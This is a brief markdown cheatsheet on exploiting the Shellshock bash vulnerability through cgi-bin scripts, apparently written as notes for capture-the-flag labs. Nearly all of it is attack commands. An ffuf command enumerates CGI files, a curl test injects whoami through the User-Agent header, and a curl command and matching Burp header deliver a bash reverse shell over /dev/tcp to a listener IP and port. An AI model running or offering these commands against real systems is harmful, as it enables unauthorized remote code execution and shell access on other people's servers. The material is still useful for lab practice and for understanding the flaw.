---
title: Cheatsheet - Shellshock 
categories: [Cheatsheet, Web]
tags: [cheatsheet/web, exploit/shell-shock]
img_path: /Cheatsheet/Web/Shellshock via cgi-bin/images
---


# Enumerate CGI files
```
ffuf -u http://<IP>/cgi-bin/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.cgi,.pl,.sh,.ps1,.py,.php,.php3,.exe,.bat,.dll,.vts,.cfg'
```


# Test
```
curl -A "() { :;}; echo Content-Type: text/html; echo; /usr/bin/whoami;" http://<MACHINE-IP>/cgi-bin/test.cgi
```

# Exploit
- Obtain shell
	```
	curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.4.53.197/4444 0>&1' http://10.10.234.83/cgi-bin/test.cgi

	#Burp:
	User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.4.53.197/4444 0>&1
	```

# Some Example
- [TryHackMe 0day - Initial Foothold via ShellShock](https://youtu.be/TS_yfDqr_3s?t=1052)
- [HackTheBox Shocker - Initial Foothold via ShellShock](https://yufongg.github.io/posts/Shocker/#tcp80-http---shell-shock)


